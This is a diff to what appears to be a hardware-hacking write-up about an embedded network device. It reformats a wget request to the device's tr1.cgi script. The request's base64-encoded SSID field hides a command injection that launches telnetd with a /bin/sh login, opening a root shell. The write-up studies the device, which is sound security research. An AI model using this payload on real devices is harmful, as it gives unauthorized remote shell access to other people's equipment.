@@ -53,7 +53,9 @@ However, after running one of the scripts, the device unexpectedly rebooted, lea
 
 Well, the following wget command was launched:
 
-`wget --load-cookies cookies.txt "<http://192.168.16.254/cgi-bin/tr1.cgi?cgi=2&mode=0&ssid=YHRlbG5ldGQgLWwvYmluL3NoYA==&ht=0&channel=0&dhcp=50&static=0&ip=0.0.0.0&subnet=0.0.0.0&gw=0.0.0.0&pppmode=0&pppusr=bnVsbA==&ppppwd=bnVsbA==&pwd=>"`
+``` bash
+wget --load-cookies cookies.txt "<http://192.168.16.254/cgi-bin/tr1.cgi?cgi=2&mode=0&ssid=YHRlbG5ldGQgLWwvYmluL3NoYA==&ht=0&channel=0&dhcp=50&static=0&ip=0.0.0.0&subnet=0.0.0.0&gw=0.0.0.0&pppmode=0&pppusr=bnVsbA==&ppppwd=bnVsbA==&pwd=>"
+```
 
 The '`wget`' command appears to be being used to send a request to the device's web server to execute a specific CGI script (tr1.cgi) with various parameters. This command seems to be exploiting a feature or a bug in the CGI script to turn on telnet. Let's break down the command to understand how it's achieving this:
 
